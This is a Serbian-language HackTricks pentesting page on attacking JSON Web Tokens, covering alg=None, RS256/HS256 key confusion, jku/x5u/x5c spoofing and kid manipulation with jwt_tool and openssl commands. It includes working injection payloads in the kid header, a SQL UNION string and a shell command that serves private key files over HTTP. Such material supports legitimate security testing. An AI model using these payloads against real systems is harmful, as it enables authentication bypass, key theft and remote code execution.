# JWT Vulnerabilnosti (Json Web Tokens)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Deo ovog posta se zasniva na sjajnom postu:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor odličnog alata za pentestiranje JWT-ova** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Brzi uspesi**

Pokrenite [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) sa modom `All Tests!` i sačekajte zelene linije
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Ako imate sreće, alat će pronaći neki slučaj u kojem web aplikacija nepravilno proverava JWT:

![](<../.gitbook/assets/image (435).png>)

Zatim, možete pretražiti zahtev u svom proxy-ju ili izvući korišćeni JWT za taj zahtev koristeći jwt\_ alat:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Menjanje podataka bez modifikacije

Možete jednostavno menjati podatke ostavljajući potpis nepromenjenim i proveriti da li server proverava potpis. Pokušajte da promenite svoje korisničko ime na "admin", na primer.

#### **Da li se proverava token?**

Da biste proverili da li se potpis JWT-a proverava:

- Poruka o grešci ukazuje na trenutnu proveru; osetljivi detalji u opširnim greškama trebaju biti pregledani.
- Promena na vraćenoj stranici takođe ukazuje na proveru.
- Nema promene ukazuje na nedostatak provere; tada možete eksperimentisati sa izmenom tvrdnji o podacima.

### Poreklo

Važno je utvrditi da li je token generisan sa strane servera ili sa strane klijenta pregledom istorije zahteva proksija.

- Tokeni koji su prvi put viđeni sa strane klijenta ukazuju na to da ključ može biti izložen kodu sa strane klijenta, što zahteva dalje istraživanje.
- Tokeni koji potiču sa strane servera ukazuju na siguran proces.

### Trajanje

Proverite da li token traje duže od 24 sata... možda nikada ne ističe. Ako postoji polje "exp", proverite da li server pravilno obrađuje to polje.

### Brute-force HMAC tajni ključ

[**Pogledajte ovu stranicu.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Izmena algoritma na None (CVE-2015-9235)

Postavite korišćeni algoritam kao "None" i uklonite deo sa potpisom.

Koristite Burp ekstenziju "JSON Web Token" da biste isprobali ovu ranjivost i promenili različite vrednosti unutar JWT-a (pošaljite zahtev na Repeater i u kartici "JSON Web Token" možete izmeniti vrednosti tokena. Takođe možete odabrati da postavite vrednost polja "Alg" na "None").

### Promena algoritma RS256(asimetrični) u HS256(simetrični) (CVE-2016-5431/CVE-2016-10555)

Algoritam HS256 koristi tajni ključ za potpisivanje i proveru svake poruke.\
Algoritam RS256 koristi privatni ključ za potpisivanje poruke i javni ključ za autentifikaciju.

Ako promenite algoritam sa RS256 na HS256, kod na serverskoj strani koristi javni ključ kao tajni ključ, a zatim koristi HS256 algoritam za proveru potpisa.

Zatim, koristeći javni ključ i menjanje RS256 u HS256, mogli bismo kreirati validan potpis. Možete dobiti sertifikat veb servera izvršavanjem ovoga:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Novi javni ključ unutar zaglavlja

Napadač ugrađuje novi ključ u zaglavlje tokena, a server koristi ovaj novi ključ za verifikaciju potpisa (CVE-2018-0114).

To se može uraditi pomoću "JSON Web Tokens" Burp ekstenzije.\
(Pošaljite zahtev na Repeater, unutar kartice JSON Web Token odaberite "CVE-2018-0114" i pošaljite zahtev).

### JWKS prevara

U uputstvima je opisan metod za procenu sigurnosti JWT tokena, posebno onih koji koriste "jku" zaglavlje. Ovaj zaglavlje treba da vodi do JWKS (JSON Web Key Set) fajla koji sadrži javni ključ neophodan za verifikaciju tokena.

- **Procena tokena sa "jku" zaglavljem**:
- Proverite URL "jku" zaglavlja kako biste se uverili da vodi do odgovarajućeg JWKS fajla.
- Izmenite vrednost "jku" zaglavlja tokena kako biste usmerili ka kontrolisanoj veb usluzi i omogućili posmatranje saobraćaja.

- **Pratite HTTP interakciju**:
- Posmatranje HTTP zahteva ka odabranom URL-u ukazuje na serverove pokušaje da preuzme ključeve sa vašeg pruženog linka.
- Prilikom korišćenja `jwt_tool` za ovaj proces, važno je ažurirati `jwtconf.ini` fajl sa vašom ličnom lokacijom JWKS kako biste olakšali testiranje.

- **Komanda za `jwt_tool`**:
- Izvršite sledeću komandu kako biste simulirali scenario sa `jwt_tool`:
```bash
python3 jwt_tool.py JWT_OVDE -X s
```

### Kid pregled problema

Opcioni zaglavlje poznato kao `kid` se koristi za identifikaciju određenog ključa, što postaje posebno važno u okruženjima gde postoji više ključeva za verifikaciju potpisa tokena. Ovaj claim pomaže u odabiru odgovarajućeg ključa za verifikaciju potpisa tokena.

#### Otkrivanje ključa putem "kid"

Kada je `kid` claim prisutan u zaglavlju, preporučuje se pretraživanje veb direktorijuma za odgovarajući fajl ili njegove varijacije. Na primer, ako je navedeno `"kid":"key/12345"`, treba pretražiti fajlove _/key/12345_ i _/key/12345.pem_ u korenu veb servera.

#### Putanja prolaza sa "kid"

`kid` claim takođe može biti iskorišćen za navigaciju kroz sistem fajlova, što potencijalno omogućava izbor proizvoljnog fajla. Moguće je testirati konektivnost ili izvršiti napade Server-Side Request Forgery (SSRF) izmenom vrednosti `kid` kako bi se ciljali određeni fajlovi ili usluge. Manipulacija JWT-om kako bi se promenila vrednost `kid` zadržavajući originalni potpis može se postići korišćenjem `-T` zastavice u jwt_tool, kao što je prikazano u primeru ispod:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Ciljajući datoteke sa predvidivim sadržajem, moguće je falsifikovati validan JWT. Na primer, datoteka `/proc/sys/kernel/randomize_va_space` u Linux sistemima, poznata po vrednosti **2**, može se koristiti u parametru `kid` sa **2** kao simetričnom lozinkom za generisanje JWT-a.

#### SQL Injection putem "kid"

Ako se sadržaj tvrdnje `kid` koristi za dohvatanje lozinke iz baze podataka, SQL injection može biti olakšan modifikacijom `kid` payload-a. Primer payload-a koji koristi SQL injection za izmenu procesa potpisivanja JWT-a je:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Ova izmena prisiljava korišćenje poznatog tajnog ključa, `ATTACKER`, za potpisivanje JWT-a.

#### OS Injection putem "kid"

Scenario u kojem parametar `kid` specificira putanju do datoteke koja se koristi u kontekstu izvršavanja komande može dovesti do ranjivosti udaljenog izvršavanja koda (RCE). Ubacivanjem komandi u parametar `kid`, moguće je otkriti privatne ključeve. Primer payload-a za postizanje RCE-a i otkrivanje ključeva je:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u i jku

#### jku

jku označava **JWK Set URL**.\
Ako token koristi "jku" **Header** tvrdnju, **proverite pruženi URL**. Ovo bi trebalo da upućuje na URL koji sadrži JWKS datoteku koja sadrži javni ključ za verifikaciju tokena. Izmenite token da jku vrednost upućuje na web servis za koji možete pratiti saobraćaj.

Prvo morate kreirati novi sertifikat sa novim privatnim i javnim ključevima.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Zatim možete koristiti na primer [**jwt.io**](https://jwt.io) da biste kreirali novi JWT sa **kreiranim javnim i privatnim ključevima i postavili parametar jku na kreirani sertifikat.** Da biste kreirali validan jku sertifikat, možete preuzeti originalni sertifikat i promeniti potrebne parametre.

Parametre "e" i "n" možete dobiti iz javnog sertifikata koristeći:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. URI koji pokazuje na skup X.509 (standard formata sertifikata) javnih sertifikata kodiranih u PEM formatu. Prvi sertifikat u skupu mora biti onaj koji se koristi za potpisivanje ovog JWT-a. Svaki sledeći sertifikat potpisuje prethodni, čime se kompletira lanac sertifikata. X.509 je definisan u RFC 52807. Potrebna je transportna sigurnost za prenos sertifikata.

Pokušajte **promeniti ovaj zaglavlje u URL koji je pod vašom kontrolom** i proverite da li je primljen bilo kakav zahtev. U tom slučaju, **možete manipulisati JWT-om**.

Da biste falsifikovali novi token koristeći sertifikat koji je pod vašom kontrolom, morate kreirati sertifikat i izvući javni i privatni ključ:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Zatim možete koristiti na primer [**jwt.io**](https://jwt.io) da biste kreirali novi JWT sa **kreiranim javnim i privatnim ključevima i postavili parametar x5u na sertifikat .crt koji je kreiran**.

![](<../.gitbook/assets/image (439).png>)

Takođe možete iskoristiti oba ova propusta **za SSRF**.

#### x5c

Ovaj parametar može sadržati **sertifikat u base64 formatu**:

![](<../.gitbook/assets/image (440).png>)

Ako napadač **generiše samopotpisani sertifikat** i kreira lažni token koristeći odgovarajući privatni ključ, zatim zameni vrednost parametra "x5c" sa novo generisanim sertifikatom i izmeni druge parametre, npr. n, e i x5t, tada će lažni token biti prihvaćen od strane servera.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Ugrađeni javni ključ (CVE-2018-0114)

Ako JWT ima ugrađeni javni ključ kao u sledećem scenariju:

![](<../.gitbook/assets/image (438).png>)

Korišćenjem sledećeg Node.js skripta moguće je generisati javni ključ iz tih podataka:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Moguće je generisati novi privatni/javni ključ, ugraditi novi javni ključ unutar tokena i koristiti ga za generisanje nove potpisa:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Možete dobiti "n" i "e" koristeći ovaj Node.js skript:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Konačno, koristeći javni i privatni ključ i nove vrednosti "n" i "e", možete koristiti [jwt.io](https://jwt.io) da biste napravili novi validan JWT sa bilo kojim informacijama.

### JTI (JWT ID)

JTI (JWT ID) tvrdnja pruža jedinstveni identifikator za JWT token. Može se koristiti kako bi se sprečilo ponovno reprodukovanje tokena.\
Međutim, zamislite situaciju u kojoj je maksimalna dužina ID-a 4 (0001-9999). Zahtevi 0001 i 10001 će koristiti isti ID. Dakle, ako backend povećava ID sa svakim zahtevom, možete zloupotrebiti ovo da biste **ponovno reprodukovali zahtev** (potrebno je poslati 10000 zahteva između svakog uspešnog reprodukovanja).

### JWT registrovane tvrdnje

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Ostali napadi

**Napadi prenošenja između usluga**

Primećeno je da neke web aplikacije oslanjaju na pouzdanu JWT uslugu za generisanje i upravljanje svojim tokenima. Zabeleženi su slučajevi gde je token, generisan za jednog klijenta od strane JWT usluge, prihvaćen od strane drugog klijenta iste JWT usluge. Ako se primeti izdavanje ili obnavljanje JWT putem usluge treće strane, treba istražiti mogućnost registracije naloga na drugom klijentu te usluge koristeći isto korisničko ime/e-poštu. Zatim treba pokušati reprodukovati dobijeni token u zahtevu cilju da se vidi da li je prihvaćen.

- Prihvatanje vašeg tokena može ukazivati na kritičan problem, što potencijalno omogućava falsifikovanje naloga bilo kog korisnika. Međutim, treba napomenuti da može biti potrebna dozvola za širi testiranje ako se registrujete na aplikaciju treće strane, jer to može ući u pravnu sivu zonu.

**Provera isteka tokena**

Istek tokena se proverava pomoću tvrdnje "exp" u Payload-u. S obzirom da se JWT često koristi bez informacija o sesiji, potrebno je pažljivo rukovanje. U mnogim slučajevima, hvatanje i reprodukovanje JWT-a druge korisnike može omogućiti impersonaciju tog korisnika. RFC za JWT preporučuje smanjenje rizika od reprodukovanja JWT napada korišćenjem tvrdnje "exp" za postavljanje vremena isteka tokena. Takođe, implementacija relevantnih provera od strane aplikacije kako bi se osigurala obrada ove vrednosti i odbacivanje isteklih tokena je ključna. Ako token sadrži tvrdnju "exp" i vremenska ograničenja za testiranje to dozvoljavaju, preporučuje se čuvanje tokena i reprodukovanje nakon što je isteklo vreme. Sadržaj tokena, uključujući parsiranje vremenske oznake i proveru isteka (vremenska oznaka u UTC formatu), može se pročitati korišćenjem zastavice -R u jwt_tool-u.

- Postoji sigurnosni rizik ako aplikacija i dalje validira token, jer to može implicirati da token nikada ne može isteći.


### Alati

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty savet**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
